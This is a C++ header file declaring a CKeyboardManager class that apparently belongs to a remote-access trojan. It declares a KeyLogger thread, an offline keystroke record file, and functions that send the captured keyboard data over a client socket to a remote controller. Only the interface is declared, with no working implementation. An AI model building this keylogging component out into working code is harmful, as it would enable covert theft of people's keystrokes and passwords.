// KeyboardManager.h: interface for the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_KEYBOARDMANAGER_H__EB2A4D2C_E756_41E3_A22C_6F7EA5C598EE__INCLUDED_)
#define AFX_KEYBOARDMANAGER_H__EB2A4D2C_E756_41E3_A22C_6F7EA5C598EE__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "Manager.h"



class CKeyboardManager : public CManager  
{
public:
	CKeyboardManager(CClientSocket *pClient);
	virtual ~CKeyboardManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	static DWORD WINAPI KeyLogger(LPVOID lparam);
	static DWORD WINAPI SendDate(LPVOID lparam);

	HANDLE m_hWorkThread,m_hSendThread;
	DWORD dKeyBoardSize;
	TCHAR	strRecordFile[MAX_PATH];
private:
	int sendStartKeyBoard();
	int sendOfflineRecord(DWORD	dwRead  = 0);
	int sendKeyBoardData(LPBYTE lpData, UINT nSize);

	bool m_bIsWorking;
};

#endif // !defined(AFX_KEYBOARDMANAGER_H__EB2A4D2C_E756_41E3_A22C_6F7EA5C598EE__INCLUDED_)
